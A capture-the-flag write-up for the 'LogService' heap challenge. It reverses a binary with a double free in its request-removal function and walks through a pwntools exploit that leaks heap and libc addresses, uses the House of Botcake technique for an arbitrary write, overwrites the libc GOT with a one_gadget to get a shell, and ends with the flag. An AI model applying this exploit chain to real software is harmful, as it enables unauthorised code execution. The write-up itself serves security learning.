# LogService

- Category: pwn
- Final point value: 207
- Number of solves: 13

A heap challenge which presented a Double Free. We exploited it using the [House of botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c) technique, which gave us a write-what-where primitive. Using this primitive, we overwrote an entry of the libc's GOT with a one_gadget and obtained a shell. [This write-up](https://nasm.re/posts/catastrophe/#house-of-botcake) helped me a lot, I would recommend you to read it too.
My write-up assumes that you are familiar with the basics of glibc allocator internals.

## Challenge description

Log requests and save it with this fast and safe Log server.

Associated files: [log](./log), [libc.so.6](./libc.so.6), [ld-2.35.so](./ld-2.35.so)

## Reverse engineering

We used Ghidra to reverse engineer the binary. It presents some features that we can commonly see in heap challenges: a menu which allow us to create, show and delete some objects ("requests" in our case). It also has some functionalities related to a log file, but only the log save is implemented, and it turned out to be irrelevant for the challenge. We observe that there is no command available for the modification of an existing request. All the choices are read directly from bytes rather than converted from string to int, and the results are returned as messages on the format: `type|size|message` (`type` and `size` being each four bytes long and little-endian) making actual human interaction with the program impossible.

All the created requests are stored in a dynamic array (`requests`), and their length in another dynamic array (`r_sizes`), both of these arrays having their address saved as a global variable. The current number of stored requests is also a global variable (`n_requests`), and we can not create more than 32 of them.

We find the vulnerability in the `remove_request` function. When a request is removed, the requests after it are shifted in the `requests` array, but `n_requests` is not updated, which will allow us to show a deleted request or free it again (Use-after-Free/Double free). One can also note that the `r_sizes` array is not updated, which could allow us to change the size of a request and see beyond its chunk boundaries.

```C
void remove_request(void)

{
  long in_FS_OFFSET;
  uint req_idx;
  int i;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  fread(&req_idx,4,1,stdin);
  if (req_idx < n_requests) {
    free(requests[req_idx]);
    for (i = req_idx; i < (int)(n_requests - 1); i = i + 1) {
      requests[i] = requests[(long)i + 1];
    }
    send_message(0,2,"OK");
  }
  else {
    send_message(1,0xb,"invalid idx");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

Before starting the exploit, let's have a quick look at the enabled protections:
```shell
$checksec --file=log
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   61 Symbols        No    0               1               log
```

Of course, every classical protection is enabled, and the server is very likely to have ASLR.

## Exploit

### Setup

We'll start by patching the log binary to have it use the same loader and libc as the server:

```shell
$ cp log log_patched
$ chmod u+x log_patched
$ chmod u+x ld-2.35.so
$ patchelf --set-interpreter $PWD/ld-2.35.so log_patched
$ patchelf --set-rpath $PWD log_patched
```

We can also create a pwntools [exploit](./attack.py), and start immediately writing wrappers for the different actions offered by the program:
```python
#!/usr/bin/python3

from pwn import *

HOST = "log.challs.teamitaly.eu"
PORT = 29006

vuln = ELF("./log")
libc = ELF("./libc.so.6")

def start():
    global p
    if args.REMOTE:
        p = remote(HOST, PORT)
    else:
        p = process("./log_patched")

def recvmsg() -> tuple[int, bytes]:
    global p
    msgtype = u32(p.recvn(4))
    msglen = u32(p.recvn(4))
    msg = p.recvn(msglen)
    return msgtype, msg

def menu(choice:int) -> None:
    mtype, _ = recvmsg()
    assert mtype == 100
    p.send(p32(choice))

def add_req(size:int, req:bytes) -> None:
    menu(0)
    p.send(p32(size))
    req += (size - len(req))*b"\0"
    p.send(req)
    mtype, _ = recvmsg()
    assert mtype == 0

def show_req(idx:int) -> bytes:
    menu(1)
    p.send(p32(idx))
    mtype, m = recvmsg()
    assert mtype == 0
    return m

def remove_req(idx:int) -> None:
    menu(2)
    p.send(p32(idx))
    mtype, _ = recvmsg()
    assert mtype == 0

def save_log() -> None:
    menu(3)
    mtype, _ = recvmsg()
    assert mtype == 0
```

### Getting leaks

Because of ASLR + PIE, we have no idea where is what in the memory. So, the first thing we'll do is to leak addresses of interesting things in the memory.
This can be accomplished by the fact that we can read free chunks, which are elements of linked lists, and thus contain interesting pointers.

We'll start by leaking the heap address thanks to a tcache chunk. The tcache chunks are singly-linked, and their pointers are "protected" by safe-linking, which just means that they are XORed with `pos >> 12`, `pos` being the address at which these pointers are written. The first tcache chunk does not have any successor, so its forward pointer is NULL, and reading it gives us the address of the heap. We can read it by creating a single request, deleting it, and show it, because we still have a pointer to it thanks to the bug in `remove_request`:

```python
add_req(0x100, b"A")
remove_req(0)
heap = unpack(show_req(0)[:5], "all") << 12
log.info(f'heap: {hex(heap)}')
```

To get the address of the libc, we can do the same with an unsorted bin chunk. They are doubly-linked, and their forward and backward pointers are not protected. We must first fill the tcache of the corresponding size first:

```python
for i in range(7):
    add_req(0x100, bytes([ord('A') + i]*0x100))
add_req(0x100, b"a")

for _ in range(7):
    remove_req(1)

remove_req(2) #a -> unsorted bin

libc.address = u64(show_req(2)[:8]) - 0x219ce0
log.info(f"Libc: {hex(libc.address)}")
```

### AAW: House of botcake

Now, in order to hijack control flow, it would be nice to have an arbitrary address write primitive. Usually in heap challenge this can be obtained by modifying the pointers of a free chunk in order to insert a fake chunk at a chosen address into a bin, and then alloc at this address. But here we do not have a way to modify an existing request, our Use-after-free vulnerability only allows us to read a free chunk. So we will have to use the double free. Searching for "double free" on [how2heap](https://github.com/shellphish/how2heap), I found the [House of botcake](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c) which seemed very promising in our situation, and then I fell upon [this write-up](https://nasm.re/posts/catastrophe/#house-of-botcake) from nasm that was explaining it very well. In a nutshell, the idea is to free the same chunk (`a`) twice in a way that it falls once in the unsorted bin, once in the tcache, then free the chunk just before it (`prev`) so that it consolidates with `a` from the unsorted bin, and allocate a bigger chunk that will cover `prev` and the metadata of `a`. `a`'s forward pointer as a `tcache` chunk can thus be modified, and a fake chunk can be linked into the tcache.

This part of this exploit is highly inspired from nasm's WU, with a few adjustments to perform our leaks and due to the fact that the `r_sizes` and `requests` arrays grow during the exploit and are regularly reallocated, sometimes getting on our way:
```python
add_req(0x100, b"A")
remove_req(0)
heap = unpack(show_req(0)[:5], "all") << 12
log.info(f'heap: {hex(heap)}')
for i in range(7):
    add_req(0x100, bytes([ord('A') + i]*0x100))
add_req(0x100, b"prev")
add_req(0x100, b"a")

for _ in range(7):
    remove_req(1)

remove_req(2) #a -> unsorted bin
remove_req(1) #prev

libc.address = u64(show_req(2)[:8]) - 0x219ce0
log.info(f"Libc: {hex(libc.address)}")

add_req(0x100, b"truc") #allocated from tcache
remove_req(2) #a -> tcache

#size adapted because another array alloced in the chunk
add_req(0x130, b"T"*0xc8 + p64(0x111) + p64(TARGET ^ (heap >> 12))) #prev, overlap with a

add_req(0x100, b"pop a from tcache")
```

With this, the next chunk allocated from the `0x100` tcache will be located at `TARGET`

### Targeting the libc's GOT

Now that we can write anywhere, we need to hijack the control flow. Something in nasm's WU caught my attention:
> I didn’t see first that only PARTIAL RELRO was enabled on the libc, so the technique I show you here was thought to face a 2.35 libc with FULL RELRO enabled that the reason why I didn’t just hijack some GOT pointers within the libc.

Our libc is also Partial RELRO:

```shell
$ checksec --file=libc.so.6
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    DSO             No RPATH   No RUNPATH   9864 Symbols      Yes   79              170             libc.so.6
```

So why not try the idea he mentioned? Let's write a chunk full of `0xdeadbeef` in the libc's GOT, and do some other action after, so that the libc has some stuff to do and may call a function from its GOT:
```python
add_req(0x130, b"T"*0xc8 + p64(0x111) + p64(libc.symbols["_GLOBAL_OFFSET_TABLE_"] ^ (heap >> 12))) #prev
add_req(0x100, b"pop a from tcache")

add_req(0x100, p64(0xdeadbeef)*0x20)
add_req(0x50, b"trololo")
```
Running this gives us a segfault, and when attaching GDB, we can see the following backtrace:
```
gef➤  bt
#0  0x00000000deadbeef in ?? ()
#1  0x00007fcedc6bf59c in __libc_message (action=action@entry=do_abort, 
    fmt=fmt@entry=0x7fcedc811b8c "%s\n") at ../sysdeps/posix/libc_fatal.c:93
#2  0x00007fcedc6d6d7c in malloc_printerr (
    str=str@entry=0x7fcedc814be0 "malloc(): invalid size (unsorted)")
    at ./malloc/malloc.c:5664
#3  0x00007fcedc6da15c in _int_malloc (av=av@entry=0x7fcedc84fc80 <main_arena>, 
    bytes=bytes@entry=0x50) at ./malloc/malloc.c:4002
#4  0x00007fcedc6db2e2 in __GI___libc_malloc (bytes=0x50) at ./malloc/malloc.c:3321
#5  0x0000563eeeda5783 in add_request ()
#6  0x0000563eeeda5256 in main ()
```
One of our `0xdeadbeef` is actually called when the libc tries to abort because our heap is broken! Now we just have to try our libc's one gadgets, and it turns out one of them worked. You can find the full exploit [here](./attack.py).

Flag: `flag{l06_5m4ll_bu6_b163xpl017}`